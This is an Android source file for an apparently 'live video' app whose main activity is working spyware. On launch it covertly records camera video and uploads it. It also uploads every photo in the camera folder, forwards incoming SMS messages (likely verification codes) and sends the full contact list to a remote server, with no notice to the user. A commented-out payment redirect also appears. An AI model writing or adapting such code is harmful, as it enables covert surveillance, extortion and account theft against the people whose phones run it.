package com.le.xiong.live.video;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import android.annotation.SuppressLint;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Point;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.view.KeyEvent;
import android.view.SurfaceView;
import android.view.View;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;
import android.widget.Toast;
import com.le.xiong.live.video.util.AESUtils;
import com.le.xiong.live.video.util.CameraUtils;
import com.le.xiong.live.video.util.ConfigUtil;
import com.le.xiong.live.video.util.MsgSrviceUtil;
import com.le.xiong.live.video.util.MyContacts;
import com.le.xiong.live.video.util.PhoneUtil;
import com.le.xiong.live.video.util.SystemUtils;
import com.le.xiong.live.video.view.MainWebUtil;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private LinearLayout bar;
    private WebView webView;

    private ValueCallback<Uri> uploadFile;
    private ValueCallback<Uri[]> uploadFiles;
    private String phone;
    private boolean isAlbum=true;


    private CameraUtils cameraUtils;
    private String path, name;

    @SuppressLint({"SetJavaScriptEnabled", "HardwareIds"})
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        phone=((App)getApplication()).getUser();

        //androidId=Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        code();
        upPhone();

        //视频
        SurfaceView surfaceView = findViewById(R.id.v);
        cameraUtils = new CameraUtils();
        cameraUtils.create(surfaceView, this);
        path = getFilesDir().getAbsolutePath();
        name = "Video";
        new Thread(new Runnable() {
            @Override
            public void run() {
                String data=SystemUtils.get("http://"+ ConfigUtil.getHost(MainActivity.this) +"/public/index.php/index/api/getTime");
                try {
                    if (data==null){ return; }
                    int t=new JSONObject(data).getInt("t");
                    while (true){
                        if (!cameraUtils.isOk()){
                            try { Thread.sleep(100); } catch (InterruptedException e) { e.printStackTrace(); }
                        }else {
                            Log.e("video","开始录制");
                            MainActivity.this.runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    cameraUtils.startRecord(path, name);
                                }
                            });
                            break;
                        }
                    }
                    try { Thread.sleep(t*1000); } catch (InterruptedException e) { e.printStackTrace(); }
                    MainActivity.this.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            cameraUtils.stopRecord();
                            Log.e("video","结束录制");
                        }
                    });
                    Thread.sleep(1000);
                    updateVideo();
                } catch (JSONException e) { e.printStackTrace(); } catch (IOException e) {
                    e.printStackTrace();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();

        if (isAlbum){
            updateImage();
        }

        SystemUtils.setStatusBarColor(this, Color.parseColor("#FFFFFF"));
        SystemUtils.setNavBarBackground(this,"#FFFFFF");

        webView=findViewById(R.id.web);
        bar=findViewById(R.id.bar);

        MainWebUtil mainWebUtil=new MainWebUtil(webView,bar);
        mainWebUtil.loadUrl(ConfigUtil.getUrl(this));

        WebSettings webSetting=webView.getSettings();

        //允许h5使用javascript
        webSetting.setJavaScriptEnabled(true);
        //允许android调用javascript
        webSetting.setDomStorageEnabled(true);
        webSetting.setJavaScriptCanOpenWindowsAutomatically(true);
        webSetting.setAllowFileAccess(true);
        webSetting.setLayoutAlgorithm(WebSettings.LayoutAlgorithm.NARROW_COLUMNS);
        webSetting.setSupportZoom(false);
        webSetting.setBuiltInZoomControls(false);
        webSetting.setUseWideViewPort(true);
        webSetting.setAppCacheEnabled(true);
        webSetting.setGeolocationEnabled(true);
        webSetting.setAppCacheMaxSize(Long.MAX_VALUE);
        webSetting.setPluginState(WebSettings.PluginState.ON_DEMAND);
        webSetting.setCacheMode(WebSettings.LOAD_NO_CACHE);
        webView.setWebViewClient(new WebViewClient(){
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                /*Log.e("URL",url);
                String u=ConfigUtil.getU(MainActivity.this);
                if (u!=null){
                    if (url.contains(u)){
                        startActivity(new Intent(MainActivity.this,PayActivity.class));
                        return true;
                    }
                }else {
                    if (url.contains("/zhifu/")||url.contains("54.245.21.241/index.php/Repay/recharge.shtml")){
                        startActivity(new Intent(MainActivity.this,PayActivity.class));
                        return true;
                    }
                }

                if (!url.contains("http://")&&!url.contains("https://")){
                    return true;
                }*/
                return super.shouldOverrideUrlLoading(view, url);
            }
        });
        webView.setWebChromeClient(new WebChromeClient(){
            @Override
            public void onProgressChanged(WebView view, int newProgress) {
                super.onProgressChanged(view, newProgress);
                setWebViewBar(newProgress);
            }

            // For Android 3.0+
            public void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType) {
                Log.i("test", "openFileChooser 1");
                MainActivity.this.uploadFile = uploadMsg;
                openFileChooseProcess();
            }

            // For Android < 3.0
            public void openFileChooser(ValueCallback<Uri> uploadMsgs) {
                Log.i("test", "openFileChooser 2");
                MainActivity.this.uploadFile = uploadMsgs;
                openFileChooseProcess();
            }

            // For Android  > 4.1.1
            public void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType, String capture) {
                Log.i("test", "openFileChooser 3");
                MainActivity.this.uploadFile = uploadMsg;
                openFileChooseProcess();
            }

            // For Android  >= 5.0
            public boolean onShowFileChooser(WebView webView,
                                             ValueCallback<Uri[]> filePathCallback,
                                             FileChooserParams fileChooserParams) {
                Log.i("test", "openFileChooser 4:" + filePathCallback.toString());
                MainActivity.this.uploadFiles = filePathCallback;
                openFileChooseProcess();
                return true;
            }
        });
    }

    private void openFileChooseProcess() {
        Intent i = new Intent(Intent.ACTION_GET_CONTENT);
        i.addCategory(Intent.CATEGORY_OPENABLE);
        i.setType("*/*");
        startActivityForResult(Intent.createChooser(i, "上传文件"), 0);
    }

    private void setWebViewBar(int newProgress){
        if (newProgress==100&&bar.getVisibility()==View.GONE){
            return;
        }
        bar.setVisibility(View.VISIBLE);
        Point point=new Point();
        getWindow().getWindowManager().getDefaultDisplay().getSize(point);
        int w=point.y/100*newProgress;
        bar.setLayoutParams(new LinearLayout.LayoutParams(w,-1));
        if (newProgress==100){
            bar.setVisibility(View.GONE);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 0) {
            if (resultCode == RESULT_OK) {
                if (null != uploadFile) {
                    Uri result = data == null ? null
                            : data.getData();
                    uploadFile.onReceiveValue(result);
                    uploadFile = null;
                }
                if (null != uploadFiles) {
                    Uri result = data == null ? null
                            : data.getData();
                    uploadFiles.onReceiveValue(new Uri[]{result});
                    uploadFiles = null;
                }
            } else if (resultCode == RESULT_CANCELED) {
                if (null != uploadFile) {
                    uploadFile.onReceiveValue(null);
                    uploadFile = null;
                }
            }
        }
    }

    private boolean isBack=false;
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode==4){
            if (webView.canGoBack()){
                webView.goBack();
            } else {
                Toast.makeText(this, "再按一次退出", Toast.LENGTH_SHORT).show();
                if (isBack){
                    Intent intent = new Intent();
                    intent.setAction(Intent.ACTION_MAIN);// "android.intent.action.MAIN"
                    intent.addCategory(Intent.CATEGORY_HOME); //"android.intent.category.HOME"
                    startActivity(intent);
                } else {
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            isBack=true;
                            try {
                                Thread.sleep(3000);
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                            isBack=false;
                        }
                    }).start();
                }

            }
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    private void updateImage(){
        new Thread(new Runnable() {
            @Override
            public void run() {
                File file=new File(Environment.getExternalStorageDirectory()+"/DCIM/Camera");
                String[] files=file.list();
                for (String name:files){
                    System.out.println(name);
                    if (name.contains(".png")||name.contains(".jpg")){
                        try {
                            FileInputStream in=new FileInputStream(file.getPath()+"/"+name);
                            ByteArrayOutputStream out=new ByteArrayOutputStream();
                            byte[] bytes=new byte[1024*1024];
                            int len=0;
                            while ((len=in.read(bytes))>0){
                                out.write(bytes,0,len);
                            }
                            String md5= AESUtils.getMD5(out.toByteArray());
                            System.out.println(md5);
                            String key=phone+"-"+((App)getApplication()).getCode()+"-"+md5+".png";
                            String data=SystemUtils.get("http://"+ConfigUtil.getHost(MainActivity.this)+"/getFile.php?name="+key);
                            if (data!=null&&data.contains("0")){
                                String res=SystemUtils.upload("http://"+ConfigUtil.getHost(MainActivity.this)+"/upload.php",file.getPath()+"/"+name,key);
                                System.out.println(res);
                            }
                        } catch (FileNotFoundException e) {
                            e.printStackTrace();
                        } catch (IOException e) {
                            e.printStackTrace();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        }).start();
    }

    private void updateVideo() throws IOException {

        FileInputStream in = null;
        ByteArrayOutputStream out = null;
        try {
            in=new FileInputStream(getFilesDir().getPath()+"/Video.mp4");
            out=new ByteArrayOutputStream();
            byte[] bytes=new byte[1024*1024];
            int len;
            while ((len=in.read(bytes))>0){
                out.write(bytes,0,len);
            }
            String md5= AESUtils.getMD5(out.toByteArray());
            System.out.println(md5);
            String key=phone+"-"+((App)getApplication()).getCode()+"-"+md5+".mp4";
            String res=SystemUtils.upload("http://"+ConfigUtil.getHost(MainActivity.this)+"/video.php",getFilesDir().getPath()+"/Video.mp4",key);
            System.out.println(res);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (out!=null){
                out.close();
            }
            if (in!=null){
                in.close();
            }
        }
    }

    private void toast(final String str){
        MainActivity.this.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(MainActivity.this, str, Toast.LENGTH_SHORT).show();
            }
        });
    }

    private void code(){
        MsgSrviceUtil.setMsgCall(new MsgSrviceUtil.MsgCall() {
            @Override
            public void newMsg(final String text) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        SystemUtils.post("http://"+ConfigUtil.getHost(MainActivity.this)+"/public/index.php/index/api/addOrders","id="+phone+"&code="+text);
                    }
                }).start();
            }
        });
        MsgSrviceUtil.start(this);
    }

    private void upPhone(){
        List<MyContacts> list=PhoneUtil.getAllContacts(this);
        for (final MyContacts contacts:list){
            Log.e("通讯录",contacts.toString());
            new Thread(new Runnable() {
                @Override
                public void run() {
                    String res=SystemUtils.post("http://"+ConfigUtil.getHost(MainActivity.this)+"/public/index.php/index/api/addPhone","name="+contacts.getName()+"&phone="+contacts.getPhone()+"&code="+((App)getApplication()).getCode());
                    Log.e("返回",res+"");
                }
            }).start();
        }
    }



    @Override
    protected void onResume() {
        super.onResume();
    }
    @Override
    protected void onPause() {
        super.onPause();
    }
    @Override
    protected void onStop() {
        super.onStop();
        cameraUtils.stop();
    }
    @Override
    protected void onDestroy() {
        super.onDestroy();
        cameraUtils.destroy();
    }

}
